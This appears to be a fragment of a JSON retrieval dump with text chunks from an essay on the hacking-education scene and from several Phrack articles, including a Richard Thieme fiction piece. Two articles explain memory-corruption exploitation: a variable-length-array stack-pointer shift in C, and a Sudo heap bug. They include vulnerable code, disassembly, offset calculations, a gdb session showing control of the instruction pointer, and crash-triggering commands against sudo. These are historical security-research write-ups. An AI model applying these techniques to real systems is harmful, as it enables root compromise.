for script kiddies to setup a shitty phishing page, when phishing is the second most common source of compromised Google accounts[19]. And to me that is not censorship, because the underlying skill is very basic web development. So to me a phishing tutorial is kinda deceitful and unnecessarily hiding the real \"hacking\" skill - web development. But I know many of my peers disagree here. Then there is the evolution of \"hacker influencer\". It was important to me at the start to be faceless anonymous. But over the years my opinion has slightly changed. I often think back to the time when I was sitting alone in my room trying to understand an article, and wished I had the videos I make today. So for me it's important to use social media and their algorithmic feeds to maximize exposure; hoping to reach that kid who wants to break through the same wall I was hitting. Nowadays I believe that my desire to have this information easily discoverable, outweighs restricting educational resources to obscure (or underground) places. In 2019 TheCyberMentor joined the scene with live streaming basic pentesting lessons for free on Twitch[20]. It kinda felt like OSCP material, just in video form and free. There were earlier attempts at creating free pentesting courses, such as SecurityTube or Cybrary, and maybe others as well. But TheCyberMentor is undoubtedly the most successful one, reaching several millions of views. This hasn't lasted long though, since building up the initial audience, he transitioned away into paid courses too. There is also some criticism regarding original content vs. taking existing (written) tutorials and turning them into videos. Certainly there is added value in improved presentation. But there is also the ethical question about highlighting the sources. This especially affects newcomers where sometimes it's obvious that they follow a typical outline from other material, without referencing it. In the past years, there has also been an interesting development about topics covered by the video creator scene. Because it has been completely dominated by \"bug bounties\". As much as I love seeing an influx of motivated young people, it feels like this is our community's version of the \"get rich quick\" scam. It leads to a huge demand for paid courses and guides that directly or indirectly promise you to make you a successful bug hunter. Currently it's very rare to see content beyond bug bounties and I wish there was more diversity. Sometimes I also think about how hacking communities organize, and how creators changed this. In the past the communities were usually divided by topics of interest, and now the communities form around personalities. Sometimes this makes me a bit uncomfortable, but this also resulted in a massive increase in exposure to the hacking world (it benefits the creator when the fan base grows). It's always difficult to see cultural change, when it evolves away from what we grew up with. But thinking back to my teenage years, I wish I could have been able to find places like that more easily, instead of having to wait until my 20s to accidentally stumble into it. Besides creating videos, there is also a growing scene live streaming on Twitch. Most of them work on challenges from HackTheBox or TryHackMe, which are platforms with commercial interest. This means the streamers provide collectively free advertising worth millions for those platforms. On",
                      "hash": "7cb430787c4deac901e94b48e252bf5a74e2a6547095e580b1765a6de3ea9c22",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8155484795570374
                    }
                  ]
                },
                {
                  "created": 1679370933072,
                  "document_id": "phrack-62-16",
                  "timestamp": 1089676800000,
                  "tags": ["phrack", "issue-62", "article-16"],
                  "hash": "05583fb63cb64188ac42514e508a8f26a840330069c45103888f1687d6a38532",
                  "text_size": 86231,
                  "chunk_count": 6,
                  "chunks": [
                    {
                      "text": "==Phrack Inc.== Volume 0x0b, Issue 0x3e, Phile #0x10 of 0x10 |=-----------------------------------------------------------------------=| |=--------------------=[ W O R L D N E W S ]=--------------------------=| |=-----------------------------------------------------------------------=| 1 - Break, Memory, by Richard Thieme 2 - The Geometry of Near, by Richard Thieme 3 - The Feasibility of Anarchy in America, by Anthony *** QUICK NEWS quiCK NEWS QUICK NEWS QUICK NEWS QUICK NEWS QUICK NEWS *** - Windows source code leaked http://ww.kuro5hin.org/story/2004/2/15/71552/7795 http://www.wired.com/news/technology/0,1282,62282,00.html - grsecurity 'Spender' makes fun of OpenBSD and Mac OS X http://seclists.org/lists/fulldisclosure/2004/Jun/0647.html - These guys have all the books about terrorist/anarchy/combat/... http://www.paladin-press.com - 29A releases first worm that spreads via mobile network http://securityresponse.symantec.com/avcenter/venc/data/epoc.cabir.html |=-----------------------------------------------------------------------=| |=-----------------------------------------------------------------------=| |=-----------------------------------------------------------------------=| Break, Memory By Richard Thieme The Evolution of the Problem The problem was not that people couldn't remember; the problem was that people couldn't forget. As far back as the 20th century, we realized that socio-historical problems were best handled on a macro level. It was inefficient to work on individuals who were, after all, nothing but birds in digital cages. Move the cage, move the birds. The challenge was to build the cage big enough to create an illusion of freedom in flight but small enough to be moved easily. When long-term collective memory became a problem in the 21st century, it wound up on my desktop. There had always been a potential for individuals to connect the dots and cause a contextual shift. We managed the collective as best we could with Chomsky Chutes but an event could break out randomly at any time like a bubble bursting. As much as we surveil the social landscape with sensors and datamine for deep patterns, we can't catch everything. It's all sensors and statistics, after all, which have limits. If a phenomenon gets sticky or achieves critical mass, it can explode through any interface, even create the interface it needs at the moment of explosion. That can gum up the works. Remembering and forgetting changed after writing was invented. The ones that remembered best had always won. Writing shifted the advantage from those who knew to those who knew how to find what was known. Electronic communication shifted the advantage once again to those who knew what they didn't need to know but knew how to get it when they did. In the twentieth century advances in pharmacology and genetic engineering increased longevity dramatically and at the same time meaningful distinctions between backward and forward societies disappeared so far as health care was concerned. The population exploded everywhere simultaneously. People who had retired in their sixties could look forward to sixty or seventy more years of healthful living. As usual, the anticipated problems - overcrowding, scarce water and food, employment for those who wanted it - were not the big issues. Crowding was managed by staggered living, generating niches in many multiples of what used to be daylight single-sided life. Life became double- sided, then triple-sided, and so on. Like early memory storage devices that packed magnetic media inside other media, squeezing them into every bit of available space, we designed multiple niches in society that allowed people to live next to one another in densely packed communities without even noticing their neighbors. Oh, people were vaguely aware that thousands of others were on the streets or in stadiums, but they might as well have been simulants for all the difference they made. We call this the Second Neolithic, the emergence of specialization at the next level squared. The antisocial challenges posed by hackers who \"flipped\" through niches for weeks at a time, staying awake on Perkup, or criminals exploiting flaws inevitably present in any new system, were anticipated and handled using risk management algorithms. In short, multisided life works. Genetic engineering provided plenty of food and water. Binderhoff Day commemorates the day that water was recycled from sewage using the Binderhoff Method. A body barely relinquishes its liquid before it's back in a glass in its hand. As to food, the management of fads enables us to play musical chairs with agri-resources, smoothing the distribution curve. Lastly, people are easy to keep busy. Serial careers, marriages and identities have been pretty much standard since the twentieth century. Trends in that direction continued at incremental rather than tipping-point levels. We knew within statistical limits when too many transitions would cause a problem, jamming intersections as it were with too many vehicles, so we licensed relationships, work-terms, and personal reinvention using traffic management algorithms to control the social flow. By the twenty-first century, everybody's needs were met. Ninety-eight per cent of everything bought and sold was just plain made up. Once we started a fad, it tended to stay in motion, generating its own momentum. People spent much of their time exchanging goods and services that an objective observer might have thought useless or unnecessary, but of course, there was no such thing as an objective observer. Objectivity requires distance, historical perspective, exactly what is lacking. Every product or service introduced into the marketplace drags in its wake an army of workers to manufacture it, support it, or clean up after it which swells the stream until it becomes a river. All of those rivers flow into the sea but the sea is never full. Fantasy baseball is a good example. It had long been noticed that baseball itself, once the sport became digitized, was a simulation. Team names were made up for as many teams as the population would watch. Players for those teams were swapped back and forth so the team name was obviously arbitrary, requiring the projection of a \"team gestalt\" from loyal fans pretending not to notice that they booed players they had cheered as heroes the year before. Even when fans were physically present at games, the experience was mediated through digital filters; one watched or listened to digital simulations instead of the game itself, which existed increasingly on the edges of the field of perception. Then the baseball strike of 2012 triggered the Great Realization. The strike was on for forty-two days before anyone noticed the absence of flesh-and-blood players because the owners substituted players made of pixels. Game Boys created game boys. Fantasy baseball had invented itself in recognition that fans might as well swap virtual players and make up teams too but the G.R. took it to the next level. After the strike, Double Fantasy Baseball became an industry, nested like a Russian doll inside Original Fantasy Baseball. Leagues of fantasy players were swapped in meta-leagues of fantasy players. Then Triple Fantasy Baseball . Quadruple Fantasy Baseball . and now the fad is Twelves in baseball football and whack-it-ball and I understand that Lucky Thirteens is on the drawing boards, bigger and better than any of its predecessors. So no, there is no shortage of arbitrary activities or useless goods. EBay was the prototype of the future, turning the world into one gigantic swap meet. If we need a police action or a new professional sport to bleed off excess hostility or rebalance the body politic, we make it up. The Hump in the Bell Curve as we call the eighty per cent that buy and sell just about everything swim blissfully in the currents of make-believe digital rivers, all unassuming. They call it the Pursuit of Happiness. And hey - who are we to argue? The memory-longevity problem came as usual completely out of fantasy left field. People were living three, four, five generations, as we used to count generations, and vividly recalled the events of their personal histories. Pharmacological assists and genetic enhancement made the problem worse by quickening recall and ending dementia and Alzheimer's. I don't mean that every single person remembered every single thing but the Hump as a whole had pretty good recall of its collective history and that's what mattered. Peer-to-peer communication means one-knows-everyone-knows and that created problems for society in general and - as a Master of Society - that makes it my business. My name is Horicon Walsh, if you hadn't guessed, and I lead the team that designs the protocols of society. I am the man behind the Master. I am the Master behind the Plan. The Philosophical Basis of the Problem The philosophical touchstone of our efforts was defined in nineteenth century America. The only question that matters is, What good is it? Questions like, what is its nature? what is its end? are irrelevant. Take manic depression, for example. Four per cent of the naturally occurring population were manic depressive in the late twentieth century. The pharmacological fix applied to the anxious or depressive one-third of the Hump attempted to maintain a steady internal state, not too high and not too low. That standard of equilibrium was accepted without question as a benchmark for fixing manic depression. Once we got the chemistry right, the people who had swung between killing themselves and weeks of incredibly productive, often genius-level activity were tamped down in the bowl, as it were, their glowing embers a mere reflection of the fire that had once burned so brightly. Evolution, in other words, had gotten it right because their good days - viewed from the top of the tent - made up for their bad days. Losing a few to suicide was no more consequential than a few soccer fans getting trampled. Believing that the Golden Mean worked on the individual as well as the macro level, we got it all wrong. That sort of mistake, fixing things according to unexamined assumptions, happened all the time when we started tweaking things. Too many dumb but athletic children spoiled the broth. Too many waddling bespectacled geeks made it too acrid. Too many willowy beauties made it too salty. Peaks and valleys, that's what we call the first half of the 21st century, as we let people design their own progeny. The feedback loops inside society kind of worked - we didn't kill ourselves - but clearly we needed to be more aware. Regulation was obviously necessary and subsequently all genetic alteration and pharmacological enhancements were cross-referenced in a matrix calibrated to the happiness of the Hump. Executing the Plan to make it all work was our responsibility, a charge that the ten per cent of us called Masters gladly accepted. The ten per cent destined to be dregs, spending their lives picking through dumpsters and arguing loudly with themselves in loopy monologues, serve as grim reminders of what humanity would be without our enlightened guidance. That's the context in which it became clear that everybody remembering everything was a problem. The Nostalgia Riots of Greater Florida were only a symptom. The Nostalgia Riots Here you had the fat tip of a long peninsular state packed like a water balloon with millions of people well into their hundreds. One third of the population was 150 or older by 2175. Some remembered sixteen major wars and dozens of skirmishes and police actions. Some had lived through forty-six recessions and recoveries. Some had lived through so many elections they could have written the scripts, that's how bad it was. Their thoughtful reflection, nuanced perspective, and appropriate skepticism were a blight on a well-managed global free-market democracy. They did not get depressed - pharmies in the food and water made sure of that - but they sure acted like depressed people even if they didn't feel like it. And depressed people tend to get angry. West Floridians lined benches from Key West through Tampa Bay all the way to the Panhandle. The view from satellites when they lighted matches one night in midwinter to demonstrate their power shows an unbroken arc along the edge of the water like a second beach beside the darker beach. All day every day they sat there remembering, comparing notes, measuring what was happening now by what had happened before. They put together pieces of the historical puzzle the way people used to do crosswords and we had to work overtime to stay a step ahead. The long view of the Elder Sub- Hump undermined satisfaction with the present. They preferred a different, less helpful way of looking at things. When the drums of the Department of System Integration, formerly the Managed Affairs and Perception Office, began to beat loudly to rouse the population of our crowded earth to a fury against the revolutionary Martian colonists who shot their resupplies into space rather than pay taxes to the earth, we thought we would have the support of the Elder Sub-Hump. Instead they pushed the drumming into the background and recalled through numerous conversations the details of past conflicts, creating a memory net that destabilized the official Net. Their case for why our effort was doomed was air-tight, but that wasn't the problem. We didn't mind the truth being out there so long as no one connected it to the present. The problem was that so many people knew it because the Elder Sub-Hump wouldn't shut up. That created a precedent and the precedent was the problem. Long-term memory, we realized, was subversive of the body politic. Where had we gotten off course? We had led the culture to skew toward youth because youth have no memory in essence, no context for judging anything. Their righteousness is in proportion to their ignorance, as it should be. But the Elder Sub-Hump skewed that skew. We launched a campaign against the seditious seniors. Because there were so many of them, we had to use ridicule. The three legs of the stool of cover and deception operations are illusion, misdirection, and ridicule, but the greatest of these is ridicule. When the enemy is in plain sight, you have to make him look absurd so everything he says is discredited. The UFO Campaign of the twentieth century is the textbook example of that strategy. You had fighter pilots, commercial pilots, credible citizens all reporting the same thing from all over the world, their reports agreeing over many decades in the small details. So ordinary citizens were subjected to ridicule. The use of government owned and influenced media like newspapers (including agency-owned-and-operated tabloids) and television networks made people afraid to say what they saw. They came to disbelieve their own eyes so the phenomena could hide in plain sight. Pretty soon no one saw it. Even people burned by close encounters refused to believe in their own experience and accepted official explanations. We did everything possible to make old people look ridiculous. Subtle images of drooling fools were inserted into news stories, short features showed ancients playing inanely with their pets, the testimony of confused seniors was routinely dismissed in courts of law. Our trump card - entertainment - celebrated youth and its lack of perspective, extoll",
                      "hash": "14fcda20ece59957c81add8f45bf7d9fd093c70f62692b8d3ffcac2583964ffd",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8151701092720032
                    }
                  ]
                },
                {
                  "created": 1679370959304,
                  "document_id": "phrack-63-14",
                  "timestamp": 1105142400000,
                  "tags": ["phrack", "issue-63", "article-14"],
                  "hash": "aa1fa4f032e85f4bdf20c8570879f1d442bfd04a15fdb7a9e75d4e5bbae5b1f5",
                  "text_size": 14835,
                  "chunk_count": 2,
                  "chunks": [
                    {
                      "text": "==Phrack Inc.== Volume 0x0b, Issue 0x3f, Phile #0x0e of 0x14 |=----=[ Clutching at straws: When you can shift the stack pointer ]=----=| |=-----------------------------------------------------------------------=| |=----------=[ Andrew Griffiths <andrewg@felinemenace.org> ]=------------=| --[ Table of contents 1 - Introduction 2 - The story 2.1 - C99 standard note 3 - Breakdown 4 - Moving on 4.1 - Requirements for exploitability 5 - Links 6 - Finishing up --[ 1 - Introduction The paper documents a rare, but none-the less interesting bug in variable sized arrays in C. This condition appears when a user supplied length is passed via a parameter to a variable declaration in a function. As a result of this, an attacker may be able to \"shift\" the stack pointer to point it to somewhere unexpected, such as above the stack pointer, or somewhere else like the Global Offset Table. --[ 2 - The story After playing a couple rounds of pool and drinking at a local pub, nemo talked about some of the fruits after the days auditing session. He mentioned that there was some interesting code constructs which he hadn't fully explored yet (perhaps because I dragged him out drinking). Basically, the code vaguely looked like: int function(int len, some_other_args) { int a; struct whatever *b; unsigned long c[len]; if(len > SOME_DEFINE) { return ERROR; } /* rest of the code */ } and we started discussing about that, and how we could take advantage of that. After various talks about the compiler emitting code that wouldn't allow it, architectures that it'd work on (and caveats of those architectures), and of course, another round or two drinks, we came to the conclusion that it'd be perfectly feasible to exploit, and it would be a standard esp -= user_supplied_value; The problem in the above code, is that if len is user-supplied it would be possible to make it negative, and move the stack pointer move closer to the top of the stack, as opposed to closer to the bottom (assuming the stack grows down.) ----[ 2.1 - C99 standard note The C99 standard allows for variable-length array declaration: To quote, \"In this example, the size of a variable-length array is computed and returned from a function: size_t fsize3 (int n) { char b[n+3]; //Variable length array. return sizeof b; // Execution timesizeof. } int main() { size_t size; size = fsize3(10); // fsize3 returns 13. return 0; }\" --[ 3 - Break down Here is the (convoluted) C file we'll be using as an example. We'll cover more things later on in the article. #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> #include <sys/types.h> int func(int len, char *stuff) { char x[len]; printf(\"sizeof(x): %d\\n\", sizeof(x)); strncpy(x, stuff, 4); return 58; } int main(int argc, char **argv) { return func(atoi(argv[1]), argv[2]); } The question arises though, what instructions does the compiler generate for the func function? Here is the resulting disassembly from \"gcc version 3.3.5 (Debian 1:3.3.5-8ubuntu2)\", gcc dmeiswrong.c -o dmeiswrong. 080483f4 <func>: 80483f4: 55 push %ebp 80483f5: 89 e5 mov %esp,%ebp ; standard function ; prologue 80483f7: 56 push %esi 80483f8: 53 push %ebx ; preserve the appropriate ; register contents. 80483f9: 83 ec 10 sub $0x10,%esp ; setup local ; variables 80483fc: 89 e6 mov %esp,%esi ; preserve the esp ; register 80483fe: 8b 55 08 mov 0x8(%ebp),%edx ; get the length 8048401: 4a dec %edx ; decrement it 8048402: 8d 42 01 lea 0x1(%edx),%eax ; eax = edx + 1 8048405: 83 c0 0f add $0xf,%eax 8048408: c1 e8 04 shr $0x4,%eax 804840b: c1 e0 04 shl $0x4,%eax The last three lines are eax = (((eax + 15) >> 4) << 4); This rounds up and aligns eax to a paragraph boundary. 804840e: 29 c4 sub %eax,%esp ; adjust esp 8048410: 8d 5c 24 0c lea 0xc(%esp),%ebx ; ebx = esp + 12 8048414: 8d 42 01 lea 0x1(%edx),%eax ; eax = edx + 1 8048417: 89 44 24 04 mov %eax,0x4(%esp) ; len argument 804841b: c7 04 24 78 85 04 08 movl $0x8048578,(%esp) ; fmt string ; \"sizeof(x): %d\\n\" 8048422: e8 d9 fe ff ff call 8048300 <_init+0x3c> ; printf 8048427: c7 44 24 08 04 00 00 movl $0x4,0x8(%esp) ; len arg to 804842e: 00 ; strncpy 804842f: 8b 45 0c mov 0xc(%ebp),%eax 8048432: 89 44 24 04 mov %eax,0x4(%esp) ; data to copy 8048436: 89 1c 24 mov %ebx,(%esp) ; where to write ; ebx = adjusted esp + 12 (see 0x8048410) 8048439: e8 e2 fe ff ff call 8048320 <_init+0x5c> ; strncpy 804843e: 89 f4 mov %esi,%esp ; restore esp 8048440: b8 3a 00 00 00 mov $0x3a,%eax ; ready to return 58 8048445: 8d 65 f8 lea 0xfffffff8(%ebp),%esp ; we restore esp again, just in case it ; didn't happen in the first place. 8048448: 5b pop %ebx 8048449: 5e pop %esi 804844a: 5d pop %ebp 804844b: c3 ret ; restore registers and return. What can we learn from the above assembly output? 1) There is some rounding done on the supplied value, thus meaning small negative values (-15 > -1) and small values (1 - 15) will become 0. This might possibly be useful, as we'll see below. When the supplied value is -16 or less, then it will be possible to move the stack pointer backwards (closer to the top of the stack). The instruction sub $eax, %esp at 0x804840e can be seen as add $16, %esp when len is -16.[1] 2) The stack pointer is subtracted by the paragraph-aligned supplied value. Since we can supply an almost arbitary value to this, we can point the stack pointer at a specified paragraph. If the stack pointer value is known, we can calcuate the offset needed to point the stack at that location in memory. This allows us to modify writable sections such as the GOT and heap. 3) gcc can output some wierd assembly constructs. --[ 4 - Moving on So what does the stack diagram look like in this case? When we reach 0x804840e (sub esp, eax) this is how it looks. +------------+ 0xc0000000 | ...... | Top of stack. | ...... | 0xbffff86c | 0x08048482 | Return address 0xbffff868 | 0xbffff878 | Saved EBP 0xbffff864 | ...... | Saved ESI 0xbffff860 | ...... | Saved EBX 0xbffff85c | ...... | Local variable space 0xbffff858 | ...... | Local variable space 0xbffff854 | ...... | Local variable space 0xbffff850 +------------+ ESP To overwrite the saved return address, we need to calculate what to make it subtract by. delta = 0xbffff86c - 0xbffff850 delta = 28 We need to subtract 12 from our delta value because of the instruction at 0x08048410 (lea 0xc(%esp),%ebx) so we end up with 16. If the adjusted delta was less than 16 we would end up overwriting 0xbffff85c, due to the paragraph alignment. Depending what is in that memory location denotes how useful it is. In this particular case its not. If we could write more than 4 bytes, it could be useful. When we set -16 AAAA as the arguments to dmeiswrong, we get: andrewg@supernova:~/papers/straws$ gdb -q ./dmeiswrong Using host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\". (gdb) set args -16 AAAA (gdb) r Starting program: /home/andrewg/papers/straws/dmeiswrong -16 AAAA sizeof(x): -16 Program received signal SIGSEGV, Segmentation fault. 0x41414141 in ?? () Based with the above information, an exploit can be written for dmeiswrong.c. See the attached file iyndwacyndwm.c for more information. The attached exploit code (iyndwacyndwm.c) works on my system (gcc version: Debian 1:3.3.5-8ubuntu2, kernel: Linux supernova 2.6.10-5-686 #1 Fri Jun 24 17:33:34 UTC 2005 i686 GNU/Linux) with success. It may fail on the readers machine due to different initial stack layout, and different compiler options / generated code. You may need to play a bit with gdb a bit to get it working. However, this technique should work fine for other people, they may just need to play around a bit to get it working as expected. To get it working for your system, have a look at what causes a segfault (this can be achieved with a simple \"for i in `seq 0 -4 -128` ; do ./dmeiswrong $i AAAA ; done\" loop and seeing if the offset segfaults. The attached Makefile implements this loop for you when you type make bf. You can then replay the offset and args in GDB to see if EIP is pointing to 0x41414141. Then its a matter of getting the stack layout correct for so the exploit will run. In the included exploit, I've made it so it tries to determine the exact offset to where the shellcode starts. This technique is further explained in [2]. Otherwise, this technique could be done via examining the heap layout at \"_start\" (entry point of the executable) and looking at what is in memory from the top, and seeing the offset, as its quite possible that things have been moved around during different kernel releases. In order to make it easier for people to play around with this technique, I've included a precompiled dmeiswrong and iyndwacyndwm files, which hopefully demonstate the problem. If iyndwacyndwm does not work for you, try iyndwacyndwm-lame which tries the standard \"pick an offset from some value (like esp)\" technique to try and gain code execution on the host. I haven't performed a wide scale test against vulnerable compilers, but due to the code construct compilers would be most likely to emit, I suspect a majority of compilers which support variable sized stack arrays to be vulnerable. Thos which wouldn't be vulnerable would be those which include code to verify if this is not a problem during runtime. Exploitability of this type of bug appears to be feasible on other architectures, such as PPC, as I was able to get it to crash with $pc being something not of my choice. (such as, 0x6f662878, and sometimes $pc would be pointing at an invalid instruction on the stack). This was done via just incrementing the value passed as the len by 4 in a loop. Make bf should point out the exploitable architectures as they should crash (eventually.) I didn't have enough time to look into this further as the time to submit the final paper drew to close, and PPC assembly and MacOSX are not my strongest skills. --[ 4.1 - Requirements for exploitability In order for an architecture / Operating System to be exploitable, the architecture needs to support having a stack which can be moved about. If the stack contains embedded flow control information, such as saved return addresses, it makes it significantly easier to exploit, and partially less dependant on what value the stack pointer contains. This in turn increases reliability in exploits, especially remote ones. Additionally, the compiler needs to: - support variable sized stack arrays (which as demonstrated above, is a feature of the C99 standard) - not emit code that performs sanity checking of the changed stack pointer. It is forseeable that if this issue gets a lot of public attention, that various compiler security patches (such as pro-police, stackguard, so fourth) will add detection of this issue. The direction the stack grows is not that relevant to the problem, as if the x86 stack grew upwards, the instruction at 0x804840e, would be written as addl %eax, %esp, and given the parameter len as -16 would could be rewritten as subl $16, %esp, which would allow access to the saved eip and saved frame pointer, amongst other things. The attached Makefile has a \"bf\" option",
                      "hash": "58fbbd72c4d375f85284c67783578f7c4b0438dcd8820980de2f63482075ce7b",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8137189745903015
                    }
                  ]
                },
                {
                  "created": 1679370797323,
                  "document_id": "phrack-57-8",
                  "timestamp": 997488000000,
                  "tags": ["phrack", "issue-57", "article-8"],
                  "hash": "e6856dcbc34caf705311fb29d10ba20460a5964efd7d1698b822dac6cdababa2",
                  "text_size": 120796,
                  "chunk_count": 10,
                  "chunks": [
                    {
                      "text": "==Phrack Inc.== Volume 0x0b, Issue 0x39, Phile #0x08 of 0x12 --=[ Disclaimer ]=-----------------------------------------------------// In this issue of Phrack, there are two similar articles about malloc based exploitation techniques. The first one explains in detail the GNU C Library implementation of the malloc interface and how it can be abused to exploit buffer overflows in malloc space. The second article is a more hands-on approach to introduce you to the idea of malloc overflows. It covers the System V implementation and the GNU C Library implementation. If you are not sure about the topic, it may be a better choice to start with it to get an idea of the subject. However, if you are serious about learning this technique, there is no way around the article by MaXX. --=[ Enjoy ]=------------------------------------------------------------// |=[ Vudo - An object superstitiously believed to embody magical powers ]=-| |=-----------------------------------------------------------------------=| |=------------=[ Michel \"MaXX\" Kaempf <maxx@synnergy.net> ]=-------------=| |=---------------[ Copyright (C) 2001 Synnergy Networks ]=---------------=| The present paper could probably have been entitled \"Smashing The Heap For Fun And Profit\"... indeed, the memory allocator used by the GNU C Library (Doug Lea's Malloc) and the associated heap corruption techniques are presented. However, it was entitled \"Vudo - An object superstitiously believed to embody magical powers\" since a recent Sudo vulnerability and the associated Vudo exploit are presented as well. --[ Contents ]---------------------------------------------------------- 1 - Introduction 2 - The \"potential security problem\" 2.1 - A real problem 2.1.1 - The vulnerable function 2.1.2 - The segmentation violation 2.2 - An unreal exploit 2.3 - Corrupting the heap 2.4 - Temporary conclusion 3 - Doug Lea's Malloc 3.1 - A memory allocator 3.1.1 - Goals 3.1.2 - Algorithms 3.1.2.1 - Boundary tags 3.1.2.2 - Binning 3.1.2.3 - Locality preservation 3.1.2.4 - Wilderness preservation 3.1.2.5 - Memory mapping 3.2 - Chunks of memory 3.2.1 - Synopsis of public routines 3.2.2 - Vital statistics 3.2.3 - Available chunks 3.3 - Boundary tags 3.3.1 - Structure 3.3.2 - Size of a chunk 3.3.3 - prev_size field 3.3.4 - size field 3.4 - Bins 3.4.1 - Indexing into bins 3.4.2 - Linking chunks in bin lists 3.5 - Main public routines 3.5.1 - The malloc(3) algorithm 3.5.2 - The free(3) algorithm 3.5.3 - The realloc(3) algorithm 3.6 - Execution of arbitrary code 3.6.1 - The unlink() technique 3.6.1.1 - Concept 3.6.1.2 - Proof of concept 3.6.2 - The frontlink() technique 3.6.2.1 - Concept 3.6.2.2 - Proof of concept 4 - Exploiting the Sudo vulnerability 4.1 - The theory 4.2 - The practice 5 - Acknowledgements 6 - Outroduction --[ 1 - Introduction ]-------------------------------------------------- Sudo (superuser do) allows a system administrator to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while logging the commands and arguments. -- http://www.courtesan.com/sudo/index.html On February 19, 2001, Sudo version 1.6.3p6 was released: \"This fixes a potential security problem. So far, the bug does not appear to be exploitable.\" Despite the comments sent to various security mailing lists after the announce of the new Sudo version, the bug is not a buffer overflow and the bug does not damage the stack. But the bug is exploitable: even a single byte located somewhere in the heap, erroneously overwritten by a NUL byte before a call to syslog(3) and immediately restored after the syslog(3) call, may actually lead to execution of arbitrary code as root. Kick off your shoes, put your feet up, lean back and just enjoy the... voodoo. The present paper focuses on Linux/Intel systems and: - details the aforementioned bug and explains why a precise knowledge of how malloc works internally is needed in order to exploit it; - describes the functioning of the memory allocator used by the GNU C Library (Doug Lea's Malloc), from the attacker's point of view; - applies this information to the Sudo bug, and presents a working exploit for Red Hat Linux/Intel 6.2 (Zoot) sudo-1.6.1-1. --[ 2 - The \"potential security problem\" ]------------------------------ ----[ 2.1 - A real problem ]-------------------------------------------- ------[ 2.1.1 - The vulnerable function ]------------------------------- The vulnerable function, do_syslog(), can be found in the logging.c file of the Sudo tarball. It is called by two other functions, log_auth() and log_error(), in order to syslog allow/deny and error messages. If the message is longer than MAXSYSLOGLEN (960) characters, do_syslog() splits it into parts, breaking up the line into what will fit on one syslog line (at most MAXSYSLOGLEN characters) and trying to break on a word boundary if possible (words are delimited by SPACE characters here). /* * Log a message to syslog, pre-pending the username and splitting the * message into parts if it is longer than MAXSYSLOGLEN. */ static void do_syslog( int pri, char * msg ) { int count; char * p; char * tmp; char save; /* * Log the full line, breaking into multiple syslog(3) calls if * necessary */ [1] for ( p=msg, count=0; count < strlen(msg)/MAXSYSLOGLEN + 1; count++ ) { [2] if ( strlen(p) > MAXSYSLOGLEN ) { /* * Break up the line into what will fit on one syslog(3) line * Try to break on a word boundary if possible. */ [3] for ( tmp = p + MAXSYSLOGLEN; tmp > p && *tmp != ' '; tmp-- ) ; if ( tmp <= p ) [4] tmp = p + MAXSYSLOGLEN; /* NULL terminate line, but save the char to restore later */ save = *tmp; [5] *tmp = '\\0'; if ( count == 0 ) SYSLOG( pri, \"%8.8s : %s\", user_name, p ); else SYSLOG( pri,\"%8.8s : (command continued) %s\",user_name,p ); /* restore saved character */ [6] *tmp = save; /* Eliminate leading whitespace */ [7] for ( p = tmp; *p != ' '; p++ ) ; [8] } else { if ( count == 0 ) SYSLOG( pri, \"%8.8s : %s\", user_name, p ); else SYSLOG( pri,\"%8.8s : (command continued) %s\",user_name,p ); } } } ------[ 2.1.2 - The segmentation violation ]---------------------------- Chris Wilson discovered that long command line arguments cause Sudo to crash during the do_syslog() operation: $ /usr/bin/sudo /bin/false `/usr/bin/perl -e 'print \"A\" x 31337'` Password: maxx is not in the sudoers file. This incident will be reported. Segmentation fault Indeed, the loop[7] does not check for NUL characters and therefore pushes p way after the end of the NUL terminated character string msg (created by log_auth() or log_error() via easprintf(), a wrapper to vasprintf(3)). When p reaches the end of the heap (msg is of course located in the heap since vasprintf(3) relies on malloc(3) and realloc(3) to allocate dynamic memory) Sudo eventually dies on line[7] with a segmentation violation after an out of-bounds read operation. This segmentation fault occurs only when long command line arguments are passed to Sudo because the loop[7] has to be run many times in order to reach the end of the heap (there could indeed be many SPACE characters, which force do_syslog() to leave the loop[7], after the end of the msg buffer but before the end of the heap). Consequently, the length of the msg string has to be many times MAXSYSLOGLEN because the loop[1] runs as long as count does not reach (strlen(msg)/MAXSYSLOGLEN + 1). ----[ 2.2 - An unreal exploit ]----------------------------------------- Dying after an illegal read operation is one thing, being able to perform an illegal write operation in order to gain root privileges is another. Unfortunately do_syslog() alters the heap at two places only: line[5] and line[6]. If do_syslog() erroneously overwrites a character at line[5], it has to be exploited during one of the syslog(3) calls between line[5] and line[6], because the erroneously overwritten character is immediately restored at line[6]. Since msg was allocated in the heap via malloc(3) and realloc(3), there is an interesting structure stored just after the end of the msg buffer, maintained internally by malloc: a so-called boundary tag. If syslog(3) uses one of the malloc functions (calloc(3), malloc(3), free(3) or realloc(3)) and if the Sudo exploit corrupts that boundary tag during the execution of do_syslog(), evil things could happen. But does syslog(3) actually call malloc functions? $ /usr/bin/sudo /bin/false `/usr/bin/perl -e 'print \"A\" x 1337'` [...] malloc( 100 ): 0x08068120; malloc( 300 ): 0x08060de0; free( 0x08068120 ); malloc( 700 ): 0x08060f10; free( 0x08060de0 ); malloc( 1500 ): 0x080623b0; free( 0x08060f10 ); realloc( 0x080623b0, 1420 ): 0x080623b0; [...] malloc( 192 ): 0x08062940; malloc( 8192 ): 0x080681c8; realloc( 0x080681c8, 119 ): 0x080681c8; free( 0x08062940 ); free( 0x080681c8 ); [...] The first series of malloc calls was performed by log_auth() in order to allocate memory for the msg buffer, but the second series of malloc calls was performed... by syslog(3). Maybe the Sudo exploit is not that unreal after all. ----[ 2.3 - Corrupting the heap ]--------------------------------------- However, is it really possible to alter a given byte of the boundary tag located after the msg buffer (or more generally to overwrite at line[5] an arbitrary character (after the end of msg) with a NUL byte)? If the Sudo exploit exclusively relies on the content of the msg buffer (which is fortunately composed of various user-supplied strings (current working directory, sudo command, and so on)), the answer is no. This assertion is demonstrated below. The character overwritten at line[5] by a NUL byte is pointed to by tmp: - tmp comes from loop[3] if there is a SPACE character among the first MAXSYSLOGLEN bytes after p. tmp then points to the first SPACE character encountered when looping from (p + MAXSYSLOGLEN) down to p. -- If the overwritten SPACE character is located within the msg buffer, there is no heap corruption at all because the write operation is not an illegal one. -- If this first encountered SPACE character is located outside the msg buffer, the Sudo exploit 